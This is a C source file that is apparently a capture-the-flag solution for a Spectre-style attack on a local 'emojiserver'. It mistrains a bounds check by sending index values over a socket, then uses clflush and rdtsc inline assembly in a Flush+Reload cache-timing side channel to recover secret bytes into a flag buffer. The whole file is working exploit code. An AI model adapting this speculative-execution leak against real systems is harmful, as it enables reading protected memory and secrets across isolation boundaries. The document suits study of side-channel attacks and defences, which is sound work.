#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <wchar.h>
#include "emojiserver.h"


#define TOTAL_TESTS	400
#define SIZE_SPECTRE	50
#define PORT 8080 
#define SIZE_ORDER 81

#define THRESHOLD	120

char flag[2560];
unsigned char *limit;
wchar_t *emojis;

unsigned long probe(char *adrs) ;



char unused1[4096]={1,2,3,6,7};
unsigned char order[81]={26, 24, 17, 19, 68, 41, 55, 57, 56, 54, 9, 53, 18, 71, 4, 63, 14, 30, 27, 12, 75, 33, 20, 38, 45, 40, 21, 69, 16, 2, 23, 13, 49, 8, 78, 76, 62, 3, 77, 67, 31, 50, 66, 70, 47, 28, 15, 29, 36, 44, 79, 25, 60, 58, 22, 0, 1, 10, 73, 52, 11, 6, 80, 65, 42, 61, 74, 37, 46, 51, 39, 35, 48, 5, 64, 32, 59, 72, 34, 7, 43};


int mySocket;
   
int createSocket() 
{ 
    int sock = 0, valread; 
    struct sockaddr_in serv_addr; 
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    { 
        printf("\n Socket creation error \n"); 
        return -1; 
    } 
   
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_port = htons(PORT); 
       
    // Convert IPv4 and IPv6 addresses from text to binary form 
    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)  
    { 
        printf("\nInvalid address/ Address not supported \n"); 
        return -1; 
    } 
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) 
    { 
        printf("\nConnection Failed \n"); 
        return -1; 
    } 
    return sock; 
} 

void flush(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" clflush 0(%0) \n"
	" mfence \n"
	" lfence \n"

 : 
 : "c" (adrs)
 : );
}

unsigned long probe(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" mfence \n"
	" lfence \n"
	" rdtsc \n"
	" lfence \n"
	" movl %%eax, %%esi \n"
	" movl (%1), %%eax \n"
	" lfence \n"
	" rdtsc \n"
	" subl %%esi, %%eax \n"
	" clflush 0(%1) \n"

 : "=a" (time)
 : "c" (adrs)
 : "%esi", "%edx");
 return time;
}

void Vuln(unsigned long x){
	send(mySocket,&x,sizeof(unsigned long),0);
}

int CheckGlobal(){
	
  unsigned char i;
  unsigned long t;
  static unsigned c=0;
  for(i=0;i<SIZE_ORDER;i++){
	t=probe((char *)&emojis[order[i]*160]);
	if (t<THRESHOLD){
		flag[c]=order[i]+'-';
		c++;
	}
  }

}
void flushAll(){
	for(int i=0;i<(SIZE_ORDER);i++){
		flush((char *)&emojis[i*160]);
	}
}
void ReadIndex(unsigned long target){
        unsigned long x[SIZE_SPECTRE+1];

	for (int i=0;i<SIZE_SPECTRE;i++){
		x[i]=rand()%26;
	}
	x[SIZE_SPECTRE]=target;
	for (int i=0;i<SIZE_SPECTRE+1;i++){
		flush((char *)limit);
		flushAll();
		Vuln(x[i]);
	}
	CheckGlobal();

}


int main(){
	unsigned long i;
	unsigned long start;
	limit=getLimit();
	emojis=getEmojis();
	mySocket=createSocket();
	memset(flag,0,sizeof(flag));
	
	printf("Using Threshold = %u\n",THRESHOLD);
	
	for (i=0;i<51;i++){
		ReadIndex(i);
	}
	
	printf("Flag: %s\n",flag);


  return 0;
}

